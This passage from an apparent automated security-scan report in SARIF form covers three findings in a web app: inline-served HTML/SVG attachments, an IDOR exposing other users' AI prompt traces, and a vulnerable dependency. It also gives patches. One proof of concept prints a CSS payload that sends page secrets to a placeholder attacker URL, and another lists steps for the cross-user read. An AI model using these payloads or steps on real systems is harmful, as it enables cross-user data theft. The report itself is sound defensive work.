          "fixes": [
            {
              "artifactChanges": [
                {
                  "artifactLocation": {
                    "uri": "src/routes/v2/attachmentsV2.ts"
                  },
                  "replacements": [
                    {
                      "deletedRegion": {
                        "startLine": 80,
                        "endLine": 85
                      },
                      "insertedContent": {
                        "text": "const safeType = safeAttachmentContentType(result.row.media_type);\n      res.setHeader(\"Content-Type\", safeType);\n      res.setHeader(\"Content-Length\", result.row.size_bytes);\n      res.setHeader(\n        \"Content-Disposition\",\n        `attachment; filename=\"${encodeURIComponent(result.row.filename)}\"`,\n      );"
                      }
                    }
                  ]
                },
                {
                  "artifactLocation": {
                    "uri": "src/routes/v2/attachmentsV2.ts"
                  },
                  "replacements": [
                    {
                      "deletedRegion": {
                        "startLine": 18,
                        "endLine": 24
                      },
                      "insertedContent": {
                        "text": "import {\n  stageToDisk,\n  uploadAttachment,\n  getAttachmentContent,\n  safeAttachmentContentType,\n} from \"../../services/attachmentService\";"
                      }
                    }
                  ]
                },
                {
                  "artifactLocation": {
                    "uri": "src/services/attachmentService.ts"
                  },
                  "replacements": [
                    {
                      "deletedRegion": {
                        "startLine": 70,
                        "endLine": 74
                      },
                      "insertedContent": {
                        "text": "export function mediaTypeForFilename(filename: string): string {\n  const ext = path.extname(filename).toLowerCase();\n  return MEDIA_TYPES[ext] ?? \"application/octet-stream\";\n}\n\n/**\n * Return a media type safe to serve inline. Active content types\n * (HTML, SVG, XHTML, JS) are coerced to `application/octet-stream` so\n * browsers download rather than render them.\n */\nexport function safeAttachmentContentType(mediaType: string): string {\n  const t = (mediaType || \"\").toLowerCase();\n  const ACTIVE = new Set([\n    \"text/html\",\n    \"application/xhtml+xml\",\n    \"image/svg+xml\",\n    \"text/javascript\",\n    \"application/javascript\",\n    \"application/x-javascript\",\n  ]);\n  return ACTIVE.has(t) ? \"application/octet-stream\" : t;\n}"
                      }
                    }
                  ]
                }
              ],
              "description": {
                "text": "1. Enforce an allowlist of safe media types on upload (e.g., images minus SVG, plain text, PDF) and reject or normalize `text/html`, `image/svg+xml`, `application/xhtml+xml`, and any `text/*` that is not plain text.\n2. Serve attachments with `Content-Disposition: attachment` (force download) and always a safe, computed `Content-Type` (never trust the client-declared type); add `X-Content-Type-Options: nosniff` (already present) plus a restrictive per-response CSP such as `sandbox` / `default-src 'none'` for active types that must be previewed.\n3. Add per-user/tenant authorization on `getAttachmentContent` rather than relying on rid secrecy.",
                "markdown": "1. Enforce an allowlist of safe media types on upload (e.g., images minus SVG, plain text, PDF) and reject or normalize `text/html`, `image/svg+xml`, `application/xhtml+xml`, and any `text/*` that is not plain text.\n2. Serve attachments with `Content-Disposition: attachment` (force download) and always a safe, computed `Content-Type` (never trust the client-declared type); add `X-Content-Type-Options: nosniff` (already present) plus a restrictive per-response CSP such as `sandbox` / `default-src 'none'` for active types that must be previewed.\n3. Add per-user/tenant authorization on `getAttachmentContent` rather than relying on rid secrecy."
              }
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "05d7a4a7e95f93cc41ed668b5f08a90da723af0cfcd3ebb5f435bb0a59f72106"
          },
          "properties": {
            "security-severity": "3.5",
            "strix_vuln_class_hash": "841d192a59e6812ef6a771cf84fa82963f628884ed58037aa16b7e6cdd3695f8",
            "strix": {
              "id": "vuln-0027",
              "severity": "low",
              "cvss": 3.5,
              "timestamp": "2026-08-18 06:45:13 UTC",
              "target": "http://host.docker.internal:3000/",
              "endpoint": "/api/v2/ontologies/attachments/:rid/content",
              "method": "GET",
              "cwe": "CWE-79",
              "impact": "Any authenticated low-privilege user can store renderer-active content (HTML/SVG) that is served inline to other authenticated users who know or can guess the attachment rid, enabling phishing UI, cross-origin CSS-based exfiltration of in-page sensitive data, and external-resource tracking of victims — despite CSP blocking inline JavaScript.",
              "technical_analysis": "`POST /api/v2/ontologies/attachments/upload?filename=...` (raw bytes) stores the uploaded file in object storage and records the client-supplied `filename` and a `Content-Type` (either the request's declared `Content-Type` or extension sniff via `mediaTypeForFilename`). There is **no allowlist** restricting which media types may be stored, so `text/html`, `image/svg+xml`, etc. are accepted.\n\n`GET /api/v2/ontologies/attachments/:rid/content` (`src/routes/v2/attachmentsV2.ts`) then does:\n\n```typescript title=src/routes/v2/attachmentsV2.ts startLineNumber=80 endLineNumber=85\nres.setHeader(\"Content-Type\", result.row.media_type);\nres.setHeader(\"Content-Length\", result.row.size_bytes);\nres.setHeader(\n  \"Content-Disposition\",\n  `inline; filename=\"${encodeURIComponent(result.row.filename)}\"`,\n);\n```\n\nServing `text/html` / `image/svg+xml` with `inline` disposition renders the bytes as active content in the fetching user's browser. Because there is no per-user authorization check on `getAttachmentContent`, any authenticated principal who learns the (unpredictable) attachment rid can fetch another user's attachment. The rid is the only \"authorization\" (a capability-by-secrecy pattern), which is a defense-in-depth weakness.\n\nCSP is `default-src 'self'; script-src 'self'; script-src-attr 'none'`, so inline `<script>` / event handlers are blocked (verified: `onerror=alert(1337)` did not fire). However:\n- `style-src 'self' https: 'unsafe-inline'` permits inline `<style>`, and the browser fetches the declaration URLs cross-origin → **CSS-based exfiltration of DOM data** (attribute selectors) was demonstrated: a `<div data-secret=\"...\">` and `<input value=\"...\">` leaked their starting characters to attacker-controlled URLs via `background:url(...)`.\n- `form-action 'self'` blocks external form POSTs, but `text/html` still renders arbitrary UI (phishing overlays, navigatable via SVG `<a>`).\n- SVG `<image href=\"https://...\">` loads external resources → tracking/active rendering.\n\nVerified live: viewer uploads `text/html` attachment; admin fetches `/api/v2/ontologies/attachments/<rid>/content` and receives `200`, `Content-Type: text/html`, `Content-Disposition: inline; filename=\"t.html\"`; the HTML is parsed into the DOM (screenshot + outerHTML confirmed rendering, and a `<style>`-based exfil request was issued cross-origin).",
              "remediation_steps": "1. Enforce an allowlist of safe media types on upload (e.g., images minus SVG, plain text, PDF) and reject or normalize `text/html`, `image/svg+xml`, `application/xhtml+xml`, and any `text/*` that is not plain text.\n2. Serve attachments with `Content-Disposition: attachment` (force download) and always a safe, computed `Content-Type` (never trust the client-declared type); add `X-Content-Type-Options: nosniff` (already present) plus a restrictive per-response CSP such as `sandbox` / `default-src 'none'` for active types that must be previewed.\n3. Add per-user/tenant authorization on `getAttachmentContent` rather than relying on rid secrecy.",
              "poc": {
                "description": "1. Authenticate as a low-privilege user (viewer).\n2. Upload an HTML file: `POST /api/v2/ontologies/attachments/upload?filename=t.html` with body `<html><body>...active content...</body></html>` and header `Content-Type: text/html`. Response gives `rid`.\n3. Authenticate as a different user (admin) and fetch `GET /api/v2/ontologies/attachments/<rid>/content`.\n4. Observe `Content-Type: text/html` + `Content-Disposition: inline` and the content rendered in-line in the browser (DOM shows the HTML parsed).\n5. To show active exfil without JS: embed `<style>div[data-secret^=\"s\"]{background:url(https://attacker/x?p=s)}</style><div data-secret=\"secret-token\">x</div>`; the victim's browser issues the cross-origin request carrying the leaked prefix.",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "CWE-639",
          "ruleIndex": 8,
          "level": "warning",
          "message": {
            "text": "IDOR: Cross-user read of Quiver AIP traces exposes LLM prompts and tool inputs\n\nThe `GET /quiver/api/v1/aip/traces/:rid` endpoint returns any user's AIP trace — including the plaintext `prompt` and `toolInvocations` — to any other authenticated user. The ownership check on `src/routes/quiver/aip.ts` contains an empty enforcement block, so it never actually rejects a mismatched caller."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "src/routes/quiver/aip.ts"
                },
                "region": {
                  "startLine": 224,
                  "endLine": 226
                }
              },
              "message": {
                "text": "Enforce trace ownership (IDOR-as-404)"
              }
            },
            {
              "logicalLocations": [
                {
                  "fullyQualifiedName": "/quiver/api/v1/aip/traces/:rid",
                  "kind": "endpoint"
                }
              ]
            }
          ],
          "fixes": [
            {
              "artifactChanges": [
                {
                  "artifactLocation": {
                    "uri": "src/routes/quiver/aip.ts"
                  },
                  "replacements": [
                    {
                      "deletedRegion": {
                        "startLine": 224,
                        "endLine": 226
                      },
                      "insertedContent": {
                        "text": "// CBAC v1: trace visible to its author. Same-org reads allowed via D-59.\n  if (trace.userRid !== actor.user.userRid && trace.userRid !== \"*\") {\n    const e = llmTimeout({ reason: \"trace not found\" });\n    res.status(404).json({\n      errorCode: \"NOT_FOUND\",\n      errorName: \"Tellus:Quiver:TraceNotFound\",\n      errorInstanceId: e.envelope.errorInstanceId,\n      parameters: { rid: req.params.rid },\n    });\n    return;\n  }"
                      }
                    }
                  ]
                }
              ],
              "description": {
                "text": "Enforce the ownership check for real: when `trace.userRid` is neither the caller's `userRid` nor the `*` wildcard, return an error and stop. Follow the IDOR-as-404 pattern already used elsewhere in the jemma/quiver routes (return 404 so trace existence is not oracle-able by co-tenants), or return 403 if explicit denial is preferred. Implement the intended same-org exception referenced by `D-59` via the OMS-backed CBAC check rather than leaving it as a comment, and add an automated test asserting that `GET /aip/traces/:rid` returns a non-200 when the requester is not the trace author.",
                "markdown": "Enforce the ownership check for real: when `trace.userRid` is neither the caller's `userRid` nor the `*` wildcard, return an error and stop. Follow the IDOR-as-404 pattern already used elsewhere in the jemma/quiver routes (return 404 so trace existence is not oracle-able by co-tenants), or return 403 if explicit denial is preferred. Implement the intended same-org exception referenced by `D-59` via the OMS-backed CBAC check rather than leaving it as a comment, and add an automated test asserting that `GET /aip/traces/:rid` returns a non-200 when the requester is not the trace author."
              }
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "3d15d689b9977bbd6875ae70a16dbbff390937f04c866ca99fb8ecab4fa69a89"
          },
          "properties": {
            "security-severity": "4.3",
            "strix_vuln_class_hash": "ebf1ba63c404f36a89caddaa6fe5f69242fcb30f0ba18d9b0a595b1226f560fa",
            "strix": {
              "id": "vuln-0028",
              "severity": "medium",
              "cvss": 4.3,
              "timestamp": "2026-08-18 06:45:44 UTC",
              "target": "tellus Ontology Engine — http://host.docker.internal:3000",
              "endpoint": "/quiver/api/v1/aip/traces/:rid",
              "method": "GET",
              "cwe": "CWE-639",
              "impact": "Any authenticated user (including the lowest-privilege \"viewer\" role and zero-role accounts) can read every other user's Quiver AIP traces. Traces contain the full plaintext LLM prompt — which in real usage embeds business data, object rids, and PII (e.g. \"show quarterly revenue for confidential clients\") — plus complete tool-invocation inputs. The trace rid is disclosed in the SSE `done` frame of every AIP call, so discovery of another user's rid is trivial for any co-tenant attacker. This is a horizontal, cross-user confidentiality breach of AI-assistant conversation content. Demonstrated impact is read of a single other user's trace (C:L); prompt content is stored plaintext so leakage is direct, not hashed.",
              "technical_analysis": "The trace-read route performs an authorization check that has no enforcement body. In `src/routes/quiver/aip.ts`, the `GET /aip/traces/:rid` handler fetches the trace and then evaluates ownership, but the \"mismatch\" branch is a comment-only no-op and execution falls through to `res.status(200).json(trace)` for any authenticated principal:\n\n```typescript title=src/routes/quiver/aip.ts startLineNumber=224 endLineNumber=227\n  // CBAC v1: trace visible to its author. Same-org reads allowed via D-59.\n  if (trace.userRid !== actor.user.userRid && trace.userRid !== \"*\") {\n    // Tightening to OMS-backed CBAC tracked under B1 C-21 (D-16 deferral).\n  }\n  res.status(200).json(trace);\n```\n\nBecause there is no `return`, `throw`, or non-2xx response inside the `if` block, the guard is dead code. The object rid is supplied in the URL path (`req.params.rid`), making this a classic user-controlled-key (IDOR/BOLA) flaw. The trace persistence layer (`src/services/quiver/aip/traces.ts`) stores `prompt` as a plaintext column alongside `promptSha256`, so prompts are directly replayable by the reader rather than only hash-verifiable. Trace rids are high-entropy UUIDs but are emitted to the caller in the SSE `done` event of every `generate`/`configure`/`assist` stream, so an attacker who can observe any done frame (or any leaked log) obtains a directly fetchable rid.",
              "remediation_steps": "Enforce the ownership check for real: when `trace.userRid` is neither the caller's `userRid` nor the `*` wildcard, return an error and stop. Follow the IDOR-as-404 pattern already used elsewhere in the jemma/quiver routes (return 404 so trace existence is not oracle-able by co-tenants), or return 403 if explicit denial is preferred. Implement the intended same-org exception referenced by `D-59` via the OMS-backed CBAC check rather than leaving it as a comment, and add an automated test asserting that `GET /aip/traces/:rid` returns a non-200 when the requester is not the trace author.",
              "poc": {
                "description": "1. As user A (editor, `userRid 633a9660-e374-41c6-87e0-d213cf50623d`), mint a Keycloak JWT and call `POST /quiver/api/v1/aip/generate` with any prompt; read the trace rid from the SSE `done` event.\n2. As user B (viewer, a different `userRid`), mint a separate Keycloak JWT.\n3. Call `GET /quiver/api/v1/aip/traces/{userA_trace_rid}` with user B's token.\n4. Observe HTTP 200 with a body containing user A's plaintext `prompt` and `toolInvocations`, confirming cross-user read.",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "CWE-407",
          "ruleIndex": 4,
          "level": "error",
          "message": {
            "text": "CVE-2026-13149 in brace-expansion 1.1.12 / 2.1.0 (exponential-time DoS)\n\nTwo pinned copies of **`brace-expansion`** (versions **`1.1.12`** and **`2.1.0`**, both via `duckdb`'s install chain) are affected by CVE-2026-13149: exponential-time complexity on crafted brace patterns causes a denial of service in `expand()`. Fixed in `1.1.16` / `2.1.2` / `5.0.7`. The package resolves via `minimatch` under `glob`, reached through `duckdb`'s `node-gyp`/`make-fetch-happen` build chain and `@mapbox/node-pre-gyp`."
          },
          "locations": [
            {
